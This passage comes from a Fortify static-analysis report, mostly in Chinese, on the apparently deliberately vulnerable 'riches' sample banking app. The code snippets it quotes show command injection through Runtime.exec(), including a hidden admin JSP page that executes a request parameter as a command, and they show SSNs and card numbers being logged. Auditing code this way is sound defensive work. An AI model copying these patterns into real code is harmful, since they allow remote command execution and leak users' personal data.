                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>18</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="EEC032057C88428594E5C922FDFC6422" ruleID="5760613C-9AF8-41EF-8431-66B6FBD4717A">
                            <Category>Command Injection</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SendMessage.java 中的 sendMail() 方法会利用由不可信赖的数据构建的命令来调用 exec()。这种调用会导致程序以攻击者的名义执行恶意命令。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>SendMessage.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/SendMessage.java</FilePath>
                                <LineStart>83</LineStart>
                                <Snippet>            }

            proc = rt.exec(cmd);

            InputStream is = proc.getInputStream();</Snippet>
                                <TargetFunction>java.lang.Runtime.exec()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>SendMessage.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/SendMessage.java</FilePath>
                                <LineStart>150</LineStart>
                                <Snippet>    }

    public void setTo(String to) {
        this.to = to;
    }</Snippet>
                                <TargetFunction>setTo(0)</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B9FA4F346AFE528D490CB9B34F811A9B" ruleID="5760613C-9AF8-41EF-8431-66B6FBD4717A">
                            <Category>Command Injection</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SendMessage.java 中的 sendMail() 方法会利用由不可信赖的数据构建的命令来调用 exec()。这种调用会导致程序以攻击者的名义执行恶意命令。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>SendMessage.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/SendMessage.java</FilePath>
                                <LineStart>83</LineStart>
                                <Snippet>            }

            proc = rt.exec(cmd);

            InputStream is = proc.getInputStream();</Snippet>
                                <TargetFunction>java.lang.Runtime.exec()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>ProfileService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/ProfileService.java</FilePath>
                                <LineStart>178</LineStart>
                                <Snippet>        {
            session = ConnectionFactory.getInstance().getSession();
            return session.find("SELECT profile.email FROM Profile profile");
        }
        catch(Exception e)</Snippet>
                                <TargetFunction>net.sf.hibernate.Session.find()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="53832999EE53697CBB622BC1D3F6A051" ruleID="5760613C-9AF8-41EF-8431-66B6FBD4717A">
                            <Category>Command Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>hidden_AdminControl.jsp 中的 _jspService() 方法会利用由不可信赖的数据构建的命令来调用 exec()。这种调用会导致程序以攻击者的名义执行恶意命令。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>hidden_AdminControl.jsp</FileName>
                                <FilePath>pages/common/hidden_AdminControl.jsp</FilePath>
                                <LineStart>95</LineStart>
                                <Snippet>			    runtimeCommand = command;

			 Process p = Runtime.getRuntime().exec(runtimeCommand);
			 BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
			 while((s = sI.readLine()) != null)</Snippet>
                                <TargetFunction>java.lang.Runtime.exec()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>hidden_AdminControl.jsp</FileName>
                                <FilePath>pages/common/hidden_AdminControl.jsp</FilePath>
                                <LineStart>74</LineStart>
                                <Snippet>%&gt;
&lt;%
   String cmd = request.getParameter("actions");

   if ((cmd != null) &amp;&amp; (cmd.length() &gt; 0))</Snippet>
                                <TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1CF9E86BB31FFD7A6A0D00F497142A11" ruleID="5760613C-9AF8-41EF-8431-66B6FBD4717A">
                            <Category>Command Injection</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SendMessage.java 中的 sendMail() 方法会利用由不可信赖的数据构建的命令来调用 exec()。这种调用会导致程序以攻击者的名义执行恶意命令。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>SendMessage.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/SendMessage.java</FilePath>
                                <LineStart>83</LineStart>
                                <Snippet>            }

            proc = rt.exec(cmd);

            InputStream is = proc.getInputStream();</Snippet>
                                <TargetFunction>java.lang.Runtime.exec()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>hidden_AdminControl.jsp</FileName>
                                <FilePath>pages/common/hidden_AdminControl.jsp</FilePath>
                                <LineStart>18</LineStart>
                                <Snippet>&lt;%@ page import="com.fortify.samples.riches.model.*" %&gt;

&lt;% String alertMessage = request.getParameter("message");
   int messageCount = 0;
   </Snippet>
                                <TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EC900FC8F8B0EA6F2E270DE218713051" ruleID="5760613C-9AF8-41EF-8431-66B6FBD4717A">
                            <Category>Command Injection</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SendMessage.java 中的 sendMail() 方法会利用由不可信赖的数据构建的命令来调用 exec()。这种调用会导致程序以攻击者的名义执行恶意命令。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>SendMessage.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/SendMessage.java</FilePath>
                                <LineStart>83</LineStart>
                                <Snippet>            }

            proc = rt.exec(cmd);

            InputStream is = proc.getInputStream();</Snippet>
                                <TargetFunction>java.lang.Runtime.exec()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>SendMessage.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/oper/SendMessage.java</FilePath>
                                <LineStart>51</LineStart>
                                <Snippet>            cmd[1] = "/c";
            java = System.getProperty("java.home") + "\\bin\\java";
            cp = System.getProperty("catalina.home") + "\\webapps\\riches\\WEB-INF\\classes";
            cmd[2] = "\"\"" + java + "\" -cp \""+ cp +"\" com.fortify.samples.riches.legacy.mail.SendMail \"" + subject + "\" \"" + severity + "\" \"" + body + "\" " + to +"\"";
        }</Snippet>
                                <TargetFunction>java.lang.System.getProperty()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="18">
                        <groupTitle>Poor Error Handling: Overly Broad Catch</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>ConnectionFactory.java 中第 31 行的 catch 块可以处理的异常种类很多，但往往会由于过多的考虑不应该在此位置处理的各种问题或故障而困扰不已。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>多个 catch 块看上去繁琐，但使用一个“简约”的 catch 块捕获高级别的异常类（如 Exception），可能会混淆那些需要特殊处理的异常，或是捕获了不应在程序中这一点捕获的异常。本质上，捕获范围过大的异常与“Java 分类定义异常”这一目的是相违背的，随着程序的增加而抛出新异常时，这种做法会十分危险。而新发生的异常类型也不会被注意到。

示例：以下代码使用了同一方式来处理三种不同的异常类型。


  try {
    doExchange();
  }
  catch (IOException e) {
    logger.error("doExchange failed", e);
  }
  catch (InvocationTargetException e) {
    logger.error("doExchange failed", e);
  }
  catch (SQLException e) {
    logger.error("doExchange failed", e);
  }


其实，与其这样，还不如使用一个单独的 catch 块来处理这三种异常，如下所示：


  try {
    doExchange();
  }
  catch (Exception e) {
    logger.error("doExchange failed", e);
  }


但是如果修改 doExchange()，以抛出需要以某种不同的方式处理的新异常类型，则范围过大的 catch 块会阻止编译器指出这一情况（有新的异常抛出）。此外，新 catch 块也将处理那些来自于 RuntimeException 的异常，比如 ClassCastException 和 NullPointerException，而这些异常的发生是不在程序员的计划之内的。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>不要捕获范围过大的异常类，比如 Exception、Throwable、Error 或 RuntimeException，除非是级别非常高的程序或线程。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 如果有问题的 catch 块立即抛出一个新异常，Fortify 安全编码规则包将不会标记出 overly broad catch 块。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>18</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="A13F3C106134CCE7994D38F510549FD8" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ConnectionFactory.java 中第 31 行的 catch 块可以处理的异常种类很多，但往往会由于过多的考虑不应该在此位置处理的各种问题或故障而困扰不已。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ConnectionFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnectionFactory.java</FilePath>
                                <LineStart>31</LineStart>
                                <Snippet>            }
        }
        catch (Exception e)
        {
			// TODO: fill in this code</Snippet>
                                <TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B91F6E09628ABF694C3D3B8D69C307C8" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ConnFactory.java 中第 74 行的 catch 块可以处理的异常种类很多，但往往会由于过多的考虑不应该在此位置处理的各种问题或故障而困扰不已。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ConnFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnFactory.java</FilePath>
                                <LineStart>74</LineStart>
                                <Snippet>            conn =  datasource.getConnection();
        }
        catch (Exception e)
        {
            e.printStackTrace();</Snippet>
                                <TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0490353C75987A209426996BE948A675" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ConnFactory.java 中第 35 行的 catch 块可以处理的异常种类很多，但往往会由于过多的考虑不应该在此位置处理的各种问题或故障而困扰不已。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>ConnFactory.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/database/ConnFactory.java</FilePath>
                                <LineStart>35</LineStart>
                                <Snippet>            }
        }
        catch (Exception e)
        {
            e.printStackTrace();</Snippet>
                                <TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="22D966465D9742DF98077376CE037C43" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LocationService.java 中第 55 行的 catch 块可以处理的异常种类很多，但往往会由于过多的考虑不应该在此位置处理的各种问题或故障而困扰不已。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>LocationService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/LocationService.java</FilePath>
                                <LineStart>55</LineStart>
                                <Snippet>                statement.close();
        }
        catch(Exception e)
        {
            //Nothing we can do... we might log this</Snippet>
                                <TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D4DEA40C01BE5765777CC168E6330E55" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>AccountService.java 中第 256 行的 catch 块可以处理的异常种类很多，但往往会由于过多的考虑不应该在此位置处理的各种问题或故障而困扰不已。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>256</LineStart>
                                <Snippet>		        MessageDigest md = MessageDigest.getInstance("SHA-2");
	        }
	        catch (Exception e){
	        }
</Snippet>
                                <TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="17">
                        <groupTitle>Privacy Violation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>footer.jsp 中的方法 _jspService() 会使机密信息处理不当，从而危及到用户的个人隐私，通常这是一种非法行为。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>Privacy Violation 会在以下情况下发生：

1. 用户私人信息进入了程序。

2. 数据被写到了一个外部介质，例如控制台、file system 或网络。


示例 1：以下代码包含了一个日志记录语句，该语句通过在日志文件中存储记录信息跟踪添加到数据库中的各条记录信息。在存储的其他数值中，getPassword() 函数可以返回一个由用户提供的、与用户帐号相关的明文密码。


pass = getPassword();
...
dbmsLog.println(id+":"+pass+":"+type+":"+tstamp);


Example 1 中的代码会将明文密码记录到文件系统中。虽然许多开发人员认为文件系统是存储数据的安全位置，但这不是绝对的，特别是涉及到隐私问题时。

在移动世界中隐私是最令人担心的问题之一，其原因有以下两点。一是设备丢失的几率较高。第二点与移动应用程序之间的进程间通信有关。移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。因为恶意软件在银行应用程序附近运行的可能性很高，所以应用程序的作者需要注意消息所包含的信息，这些消息将会发送给在设备上运行的其他应用程序。移动应用程序之间的进程间通信不应包含敏感信息。

示例 2：以下代码会从 Android WebView 存储中读取给定站点的用户名和密码，并将其广播给所有注册的接收者。

...
webview.setWebViewClient(new WebViewClient() {
  public void onReceivedHttpAuthRequest(WebView view,
        HttpAuthHandler handler, String host, String realm) {
    String[] credentials = view.getHttpAuthUsernamePassword(host, realm);
    String username = credentials[0];
    String password = credentials[1];
    Intent i = new Intent();
    i.setAction("SEND_CREDENTIALS");
    i.putExtra("username", username);
    i.putExtra("password", password);
    view.getContext().sendBroadcast(i);
  }
});
...


此示例存在多个问题。首先，WebView 凭证以明文的形式存储且不经过 hash 处理。因此，如果用户拥有 root 设备（或使用仿真器），他/她就能读取存储的给定站点的密码。其次，明文凭证将被广播给所有注册的接收者，这就意味着任何使用 SEND_CREDENTIALS 收听的注册接收者都将收到消息。即使权限限制接收者人数，广播也不会受到保护；既然这样，我们也不建议将权限作为修复方式使用。

可以通过多种方式将私人数据输入到程序中：

— 以密码或个人信息的形式直接从用户处获取

— 由应用程序访问数据库或者其他数据存储形式

— 间接地从合作者或者第三方处获取

通常，在移动环境下，此私人信息除了包括密码、SSN 和其他常规个人信息之外，还包括以下信息：

- 位置

- 手机号码

- 序列号和设备 ID

- 网络运营商信息

- 语音信箱信息


有时，某些数据并没有贴上私人数据标签，但在特定的上下文中也有可能成为私人信息。比如，通常认为学生的学号不是私人信息，因为学号中并没有明确而公开的信息用以定位特定学生的个人信息。但是，如果学校用学生的社会保障号码生成学号，那么这时学号应被视为私人信息。

安全和隐私似乎一直是一对矛盾。从安全的角度看，您应该记录所有重要的操作，以便日后可以鉴定那些非法的操作。然而，当其中牵涉到私人数据时，这种做法就存在一定风险了。

虽然私人数据处理不当的方式多种多样，但常见风险来自于盲目信任。程序员通常会信任运行程序的操作环境，因此认为将私人信息存放在文件系统、注册表或者其他本地控制的资源中是值得信任的。尽管已经限制了某些资源的访问权限，但仍无法保证所有访问这些资源的个体都是值得信任的。例如，2004 年，一个不道德的 AOL 员工将大约 9200 万个私有客户电子邮件地址卖给了一个通过垃圾邮件进行营销的境外赌博网站 [1]。

鉴于此类备受瞩目的信息盗取事件，私人信息的收集与管理正日益规范化。要求各个组织应根据其经营地点、所从事的业务类型及其处理的私人数据性质，遵守下列一个或若干个联邦和州的规定：

- Safe Harbor Privacy Framework [3]

- Gramm-Leach Bliley Act (GLBA) [4]

- Health Insurance Portability and Accountability Act (HIPAA) [5]

- California SB-1386 [6]

尽管制定了这些规范，Privacy Violation 漏洞仍时有发生。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>当安全和隐私的需要发生矛盾时，通常应优先考虑隐私的需要。为满足这一要求，同时又保证信息安全的需要，应在退出程序前清除所有私人信息。

为加强隐私信息的管理，应不断改进保护内部隐私的原则，并严格地加以执行。这一原则应具体说明应用程序应该如何处理各种私人数据。在贵组织受到联邦或者州法律的制约时，应确保您的隐私保护原则尽量与这些法律法规保持一致。即使没有针对贵组织的相应法规，您也应当保护好客户的私人信息，以免失去客户的信任。

保护私人数据的最好做法就是最大程度地减少私人数据的暴露。不应允许应用程序、流程处理以及员工访问任何私人数据，除非是出于职责以内的工作需要。正如最小授权原则一样，不应该授予访问者超出其需求的权限，对私人数据的访问权限应严格限制在尽可能小的范围内。

对于移动应用程序，请确保它们从不与在设备上运行的其他应用程序进行任何敏感数据通信。存储私人数据时，通常都应加密。对于 Android 以及其他任何使用 SQLite 数据库的平台来说，SQLCipher 是一个不错的备选方案。SQLCipher 是对 SQLite 数据库的扩展，为数据库文件提供了透明的 256 位 AES 加密。因此，凭证可以存储在加密的数据库中。

示例 3：以下代码演示了如何在下载必要的二进制文件后将 SQLCipher 集成到 Android 应用程序中，并将凭据存储到数据库文件中。

import net.sqlcipher.database.SQLiteDatabase;
...
  SQLiteDatabase.loadLibs(this);
  File dbFile = getDatabasePath("credentials.db");
  dbFile.mkdirs();
  dbFile.delete();
  SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbFile, "credentials", null);
  db.execSQL("create table credentials(u, p)");
  db.execSQL("insert into credentials(u, p) values(?, ?)", new Object[]{username, password});
...


请注意，对 android.database.sqlite.SQLiteDatabase 的引用可以使用 net.sqlcipher.database.SQLiteDatabase 代替。

要在 WebView 存储上启用加密，需要使用 sqlcipher.so 库重新编译 WebKit。

示例 4：以下代码会从 Android WebView 存储中读取给定站点的用户名和密码，但它仅会在内部广播，而不是将其广播给所有注册的接收者，这样此广播只能由同一应用程序的其他部分看到。

...
webview.setWebViewClient(new WebViewClient() {
  public void onReceivedHttpAuthRequest(WebView view,
        HttpAuthHandler handler, String host, String realm) {
    String[] credentials = view.getHttpAuthUsernamePassword(host, realm);
    String username = credentials[0];
    String password = credentials[1];
    Intent i = new Intent();
    i.setAction("SEND_CREDENTIALS");
    i.putExtra("username", username);
    i.putExtra("password", password);
    LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i);
  }
});
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 要彻底审计所有的 Privacy Violation 漏洞，措施之一就是确保自定义的规则可以识别所有进入程序的私人或敏感信息。无法自动识别多数私人数据信息。若不使用自定义规则，您执行的 Privacy Violation 漏洞检查可能是不完整的。

2. 可使用 Fortify Java Annotations、FortifyPassword、FortifyNotPassword、FortifyPrivate 和 FortifyNotPrivate 来指示哪些字段和变量代表密码和私人数据。

3. 许多现代 Web 框架都会提供对用户输入执行验证的机制（包括 Struts 和 Spring MVC）。为了突出显示未经验证的输入源，Fortify 安全编码规则包会对 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题动态重新调整优先级，即在采用框架验证机制时降低这些问题被利用的几率并提供指向相应证据的指针。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队开发了 Data Validation（数据验证）项目模板，该模板根据应用于输入源的验证机制按文件夹对问题进行了分组。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>17</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="99208C08E3658FD59780F5D1AA5D8D7B" ruleID="E1E5F036-A3C4-499F-B699-F118F61432B6">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>AccountService.java 中的方法 writeCheck() 会使机密信息处理不当，从而危及到用户的个人隐私，通常这是一种非法行为。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>145</LineStart>
                                <Snippet>            criteria.add(Expression.eq("acctno", acct));
            fromAcct = (Account) criteria.uniqueResult();
            log.warning("check from: " + fromAcct.getAcctno() + " using the credit card on file: " + fromAcct.getCcn());
            if (amount &gt; fromAcct.getBalance())
            {</Snippet>
                                <TargetFunction>java.util.logging.Logger.warning()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>Account.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/Account.java</FilePath>
                                <LineStart>63</LineStart>
                                <Snippet>
	public String getCcn() {
		return ccn;
	}
</Snippet>
                                <TargetFunction>Read this.ccn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="853DFAD0F79CA6BA13F712DA77CE28B3" ruleID="9C96C95D-D448-4B86-940D-D0371E42CB88">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>footer.jsp 中的方法 _jspService() 会使机密信息处理不当，从而危及到用户的个人隐私，通常这是一种非法行为。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>footer.jsp</FileName>
                                <FilePath>pages/tiles/footer.jsp</FilePath>
                                <LineStart>9</LineStart>
                                <Snippet>	&lt;tr&gt;
		&lt;td align="center"&gt;
			&lt;span&gt;&lt;%=name%&gt; /SSN &lt;%=ssn%&gt;&lt;/span&gt;
		&lt;/td&gt;
	&lt;/tr&gt;</Snippet>
                                <TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>footer.jsp</FileName>
                                <FilePath>pages/tiles/footer.jsp</FilePath>
                                <LineStart>9</LineStart>
                                <Snippet>	&lt;tr&gt;
		&lt;td align="center"&gt;
			&lt;span&gt;&lt;%=name%&gt; /SSN &lt;%=ssn%&gt;&lt;/span&gt;
		&lt;/td&gt;
	&lt;/tr&gt;</Snippet>
                                <TargetFunction>Read ssn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7F0126512764FE3247B23C45BCFE417E" ruleID="CFF78779-2651-44BB-AEFB-BCADD99D4C79">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>AccountSummary.java 中的方法 execute() 会使机密信息处理不当，从而危及到用户的个人隐私，通常这是一种非法行为。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>AccountSummary.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/AccountSummary.java</FilePath>
                                <LineStart>33</LineStart>
                                <Snippet>		}

        ServletActionContext.getServletContext().log("Account Summary request for: "+name+" with ssn: "+ssn);

        super.execute();</Snippet>
                                <TargetFunction>javax.servlet.ServletContext.log()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>AccountSummary.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/AccountSummary.java</FilePath>
                                <LineStart>33</LineStart>
                                <Snippet>		}

        ServletActionContext.getServletContext().log("Account Summary request for: "+name+" with ssn: "+ssn);

        super.execute();</Snippet>
                                <TargetFunction>Read this.ssn()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C8C6CFFAC5D6B7BBCC2AA9EB6458CF9A" ruleID="CFF78779-2651-44BB-AEFB-BCADD99D4C79">
                            <Category>Privacy Violation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>AccountSummary.java 中的方法 execute() 会使机密信息处理不当，从而危及到用户的个人隐私，通常这是一种非法行为。</Abstract>
                            <Friority>High</Friority>
                            <Primary>
                                <FileName>AccountSummary.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/AccountSummary.java</FilePath>
                                <LineStart>33</LineStart>
                                <Snippet>		}

        ServletActionContext.getServletContext().log("Account Summary request for: "+name+" with ssn: "+ssn);

        super.execute();</Snippet>
                                <TargetFunction>javax.servlet.ServletContext.log()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>Profile.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/Profile.java</FilePath>
                                <LineStart>78</LineStart>
                                <Snippet>
    public String getSsno() {
      return ssno;
    }
</Snippet>
                                <TargetFunction>Read this.ssno()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D7D3A0CF880E5AB12A70575C177A787C" ruleID="E1E5F036-A3C4-499F-B699-F118F61432B6">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>AccountService.java 中的方法 writeCheck() 会使机密信息处理不当，从而危及到用户的个人隐私，通常这是一种非法行为。</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>145</LineStart>
                                <Snippet>            criteria.add(Expression.eq("acctno", acct));
            fromAcct = (Account) criteria.uniqueResult();
            log.warning("check from: " + fromAcct.getAcctno() + " using the credit card on file: " + fromAcct.getCcn());
            if (amount &gt; fromAcct.getBalance())
            {</Snippet>
                                <TargetFunction>java.util.logging.Logger.warning()</TargetFunction>
                            </Primary>
                            <Source>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>145</LineStart>
                                <Snippet>            criteria.add(Expression.eq("acctno", acct));
            fromAcct = (Account) criteria.uniqueResult();
            log.warning("check from: " + fromAcct.getAcctno() + " using the credit card on file: " + fromAcct.getCcn());
            if (amount &gt; fromAcct.getBalance())
            {</Snippet>
                                <TargetFunction>com.fortify.samples.riches.model.Account.getCcn()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="16">
                        <groupTitle>Missing Check against Null</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>hidden_AdminControl.jsp 中的 _jspService() 方法可能会间接引用第 90 行上的空指针，因为它不对 getProperty() 的返回值进行检查，而此返回值可能为 null。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>几乎每一个对软件系统的严重攻击都是从违反程序员的假设开始的。攻击后，程序员的假设看起来既脆弱又拙劣，但攻击前，许多程序员会在午休时间为自己的种种假设做很好的辩护。

在代码中很容易发现的两个可疑的假设是：一是这个函数调用不可能出错；二是即使出错了，也不会对系统造成什么重要影响。当程序员忽略函数返回值时，就暗示着自己是基于上述任一假设来执行操作。



示例 1：  以下代码在调用成员函数 compareTo() 之前，不会检查 getParameter() 返回的字符串是否为 null，从而可能会造成 null dereference。


String itemName = request.getParameter(ITEM_NAME);
	if (itemName.compareTo(IMPORTANT_ITEM)) {
		...
	}
	...


例 2：。以下代码显示了这样一个例子，一个系统属性被设置为了 null，随后间接引用它的程序员错误地认为该属性值是已定义的。


System.clearProperty("os.name");
...
String os = System.getProperty("os.name");
if (os.equalsIgnoreCase("Windows 95") )
	System.out.println("Not supported");


对于这种编码错误的一贯辩解是：

“我知道请求的值肯定会存在，因为....如果不存在，程序就无法执行所需的行为，因此是处理该错误还是允许程序自行崩溃而间接引用 null 也就无关紧要了。”

但是，攻击者对于发现程序中的意外情况十分在行，特别是发生异常时。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
